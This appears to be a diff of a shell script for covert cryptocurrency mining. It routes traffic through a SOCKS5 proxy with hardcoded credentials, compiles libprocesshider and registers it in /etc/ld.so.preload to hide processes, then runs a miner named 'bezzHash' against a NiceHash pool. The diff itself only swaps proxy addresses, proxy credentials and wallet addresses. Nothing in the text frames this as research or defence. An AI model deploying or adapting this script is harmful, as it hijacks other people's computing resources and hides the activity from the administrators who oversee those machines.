@@ -11,9 +11,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 154.85.103.138:6429
-socks5_username = lebarankita
-socks5_password = buatTHRan
+socks5 = 104.227.76.30:6127
+socks5_username = sikencot
+socks5_password = mbah2237
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -44,4 +44,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.PAKLENDIR --dualmode TONDUAL --dualpool daggerhashimoto.usa-west.nicehash.com:3353 --dualuser 3PbuXfuwVE4T2uGMFdfvzZJPCLnh9gB9cV
+./graftcp/graftcp ./bezzHash --algo ETHASH --pool daggerhashimoto.usa-west.nicehash.com:3353 --user 3PbuXfuwVE4T2uGMFdfvzZJPCLnh9gB9cV.RAISHA
